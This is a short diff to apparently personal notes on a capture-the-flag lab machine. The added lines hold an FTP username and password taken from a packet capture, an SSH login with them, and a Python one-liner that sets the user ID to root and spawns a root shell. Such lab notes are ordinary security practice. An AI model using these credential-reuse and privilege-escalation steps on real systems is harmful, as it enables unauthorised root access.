@@ -3,3 +3,10 @@
 10.10.10.245:80
 10.10.10.245:22
 
+- 0.pcap
+user nathan
+PASS Buck3tH4TF0RM3!
+- RCE
+
+ssh nathan@ip
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
